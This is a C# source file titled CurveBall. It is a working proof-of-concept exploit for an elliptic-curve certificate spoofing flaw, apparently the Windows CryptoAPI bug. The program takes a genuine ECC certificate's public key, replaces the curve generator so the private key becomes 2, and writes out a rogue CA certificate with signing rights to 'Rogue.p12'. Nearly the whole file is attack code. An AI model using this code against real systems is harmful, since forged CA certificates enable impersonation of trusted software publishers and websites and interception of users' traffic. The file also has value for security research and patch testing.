using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using CurveBall.Extensions;
using Org.BouncyCastle.Asn1.X509;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Operators;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Math;
using Org.BouncyCastle.Math.EC;
using Org.BouncyCastle.Pkcs;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.X509;
using X509Certificate = Org.BouncyCastle.X509.X509Certificate;

namespace CurveBall
{
    internal static class Program
    {
        private static void Main(string[] args)
        {
            Console.WriteLine("=== CurveBall ===");

            if (args.Length != 1)
            {
                throw new ArgumentException("Please specify a path to the certificate");
            }
            
            Console.WriteLine("= Loading certificate");
            var certificate = new X509Certificate2(args[0]);
            certificate.AssertECC();
            
            Console.WriteLine("= Fetching public key");
            var publicKeyParameters = certificate.GetPublicKeyParameters();

            Console.WriteLine("= Choosing private key k = 2");
            var newPrivateKey = publicKeyParameters.Parameters.Curve.FromBigInteger(BigInteger.Two);
            Console.WriteLine("= Computing new generator G = k^(-1)Q");
            var newGenerator = CreateGenerator(publicKeyParameters, newPrivateKey);

            Console.WriteLine("= Creating X509Certificate");
            var newDomainParameters = new ECDomainParameters(publicKeyParameters.Parameters.Curve, newGenerator, publicKeyParameters.Parameters.N);
            var newPublicKeyParameters = new ECPublicKeyParameters(publicKeyParameters.Q, newDomainParameters);
            var newPrivateKeyParameters = new ECPrivateKeyParameters(newPrivateKey.ToBigInteger(), newDomainParameters);

            var newCertificate = CreateX509Certificate(certificate, newPublicKeyParameters, newPrivateKeyParameters);
            Console.WriteLine("= Writing to file (*.p12)");
            WriteToP12(newCertificate, newPrivateKeyParameters);
        }

        // Returns G = k^(-1)Q. Here k^(-1) is the multiplicative inverse mod #E(F_q).
        private static ECPoint CreateGenerator(ECPublicKeyParameters parameters, ECFieldElement privateKey)
        {
            var privateKeyInverse = privateKey.ToBigInteger().ModInverse(parameters.Parameters.Curve.Order);
            return parameters.Q.Multiply(privateKeyInverse).Normalize();
        }

        private static void WriteToP12(X509Certificate newCertificate, AsymmetricKeyParameter privateKeyParameters)
        {
            var pkcs12Store = new Pkcs12Store();
            var certEntry = new X509CertificateEntry(newCertificate);
            pkcs12Store.SetCertificateEntry("RougeCA", certEntry);
            pkcs12Store.SetKeyEntry("RougeCA", new AsymmetricKeyEntry(privateKeyParameters), new[] {certEntry});

            using (var fileStream = new FileStream("Rogue.p12", FileMode.Create, FileAccess.Write))
            {
                pkcs12Store.Save(fileStream, new[] {'T', 'e', 's', 't', '1', '2', '3', '4',}, new SecureRandom());
            }
        }

        private static X509Certificate CreateX509Certificate(X509Certificate2 certificate, AsymmetricKeyParameter publicKeyParameters, AsymmetricKeyParameter privateKeyParameters)
        {
            var constructor = new X509V3CertificateGenerator();
            constructor.SetSerialNumber(new BigInteger(certificate.GetSerialNumber().Reverse().ToArray()));
            constructor.SetSubjectDN(new X509Name("CN=DoNotTrust, C=Denmark"));
            constructor.SetIssuerDN(new X509Name("CN=DoNotTrust, C=Denmark"));
            constructor.SetNotBefore(DateTime.Now);
            constructor.SetNotAfter(DateTime.Now.Add(TimeSpan.FromDays(3650)));
            constructor.SetPublicKey(publicKeyParameters);
            constructor.AddExtension(X509Extensions.KeyUsage, false, new KeyUsage(KeyUsage.KeyCertSign | KeyUsage.CrlSign));
            constructor.AddExtension(X509Extensions.BasicConstraints, false, new BasicConstraints(true));

            var signatureFactory = new Asn1SignatureFactory(certificate.SignatureAlgorithm.Value, privateKeyParameters);
            var newCertificate = constructor.Generate(signatureFactory);
            return newCertificate;
        }
    }
}